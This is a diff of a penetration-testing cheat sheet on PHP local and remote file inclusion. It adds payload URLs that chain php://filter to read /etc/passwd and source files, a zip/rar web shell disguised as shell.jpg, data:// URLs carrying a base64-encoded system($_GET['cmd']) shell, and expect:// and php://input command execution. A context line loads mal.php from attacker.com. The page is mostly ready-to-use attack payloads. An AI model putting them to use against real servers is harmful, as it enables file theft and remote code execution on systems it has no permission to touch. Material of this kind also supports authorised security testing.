@@ -19,7 +19,7 @@ http://example.com/index.php?page=\\attacker.com\shared\mal.php
 #### Basic LFI
 
 {% tabs %}
-{% tab title="stripped non-recursively" %}
+{% tab title="Stripped Non-recursively" %}
 You might be able to use nested traversal sequences, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped.
 
 ```url
@@ -29,7 +29,7 @@ http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 ```
 {% endtab %}
 
-{% tab title="URL encoding" %}
+{% tab title="URL Encoding" %}
 In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. \
 You can sometimes bypass this kind of sanitization by **URL encoding**, or **even double URL encoding**, the `../` characters, resulting in `%2e%2e%2f` or `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also do the trick.
 
@@ -41,7 +41,7 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 {% endtab %}
 
-{% tab title="Path validation" %}
+{% tab title="Path Validation" %}
 Maybe the back-end is checking the folder path:
 
 ```url
@@ -49,7 +49,7 @@ http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
 ```
 {% endtab %}
 
-{% tab title="Folder identification" %}
+{% tab title="Folder Identification" %}
 Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files.&#x20;
 
 1. identify the "depth" of you current directory by succesfully retrieving `/etc/passwd` (if on Linux):
@@ -94,7 +94,7 @@ http://example.com/index.php?page=../../../etc/passwd%00
 ```
 {% endtab %}
 
-{% tab title="Path truncation" %}
+{% tab title="Path Truncation" %}
 Bypass the append of more chars at the end of the provided string (bypass of: $\_GET\['param']."php")
 
 {% hint style="info" %}
@@ -113,7 +113,7 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
 ```
 {% endtab %}
 
-{% tab title="Filter bypass tricks" %}
+{% tab title="Filter Bypass Tricks" %}
 Here are some payload that may evade filters
 
 ```
@@ -125,27 +125,136 @@ Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/
 {% endtab %}
 {% endtabs %}
 
-#### LFI / RFI using PHP wrappers
+#### LFI / RFI using PHP filters
 
 {% tabs %}
-{% tab title="First Tab" %}
+{% tab title="String " %}
+Using string filters, we can processe all stream data through the specified function
 
+```bash
+# String Filters
+## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
+http://example.com/index.php?page=php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
+
+## Same chain without the "|" char
+http://example.com/index.php?page=php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd
+
+## string.string_tags example
+http://example.com/index.php?page=php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code;?>lalalala
+```
 {% endtab %}
 
-{% tab title="Second Tab" %}
+{% tab title="Conversion" %}
+Like the string.\* filters, the convert.\* filters perform conversion actions similar to their names.
 
+```bash
+# Conversion filter
+## B64 decode
+http://example.com/index.php?page=php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=
+
+## B64 encode
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+## Chain B64 encode and decode
+http://example.com/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
+
+## convert.quoted-printable-encode example
+http://example.com/index.php?page=php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
+=C2=A3hellooo=3D
+
+## convert.iconv.utf-8.utf-16le
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
+```
+{% endtab %}
+
+{% tab title="Compression" %}
+The [Compression Wrappers](https://www.php.net/manual/en/wrappers.compression.php) provide a way of creating gzip and bz2 compatible files on the local filesystem.
+
+```bash
+# Compresion Filter
+## Compress + B64
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+
+#PHP code To decompress the data locally
+readfile('php://filter/zlib.inflate/resource=test.deflated');
+```
 {% endtab %}
 {% endtabs %}
 
-#### LFI / RFI using protocols
+#### LFI / RFI using PHP protocols & wrappers
 
 {% tabs %}
-{% tab title="First Tab" %}
+{% tab title=" File Descriptors" %}
+This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
 
+```bash
+http://example.com/index.php?page=php://fd/3
+```
 {% endtab %}
 
-{% tab title="Second Tab" %}
+{% tab title="Zip & Rar" %}
+Upload a Zip or Rar file with a PHPShell inside and access it.\
+In order to be able to abuse the rar protocol it **need to be specifically activated**.
 
+```bash
+#Create the zip file
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+
+# To compress with rar
+rar a payload.rar payload.php;
+mv payload.rar shell.jpg;
+rm payload.php
+
+#Upload the archive and access it as follow:
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+http://example.com/index.php?page=rar://shell.jpg%23payload.php
+```
+{% endtab %}
+
+{% tab title="Data" %}
+With the data wrapper, you can inject PHP code you want executing directly into the URL:
+
+{% hint style="info" %}
+Note that this wrapper is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**
+{% endhint %}
+
+```bash
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+```
+{% endtab %}
+
+{% tab title="Expect" %}
+Expect wrapper **has to be activated**. You can execute code using this.
+
+```
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
+```
+{% endtab %}
+
+{% tab title="Input" %}
+php://input is a read-only stream that allows you to read raw data from the request body. php://input is not available in POST requests with `enctype="multipart/form-data"` if [enable\_post\_data\_reading](https://www.php.net/manual/en/ini.core.php#ini.enable-post-data-reading) option is enabled.
+
+Specify your payload in the POST parameters
+
+```
+http://example.com/index.php?page=php://input
+POST DATA: <?php system('id'); ?>
+```
+{% endtab %}
+
+{% tab title="Others" %}
+Check more possible supported protocols [here](https://www.php.net/manual/en/wrappers.php)
 {% endtab %}
 {% endtabs %}
 
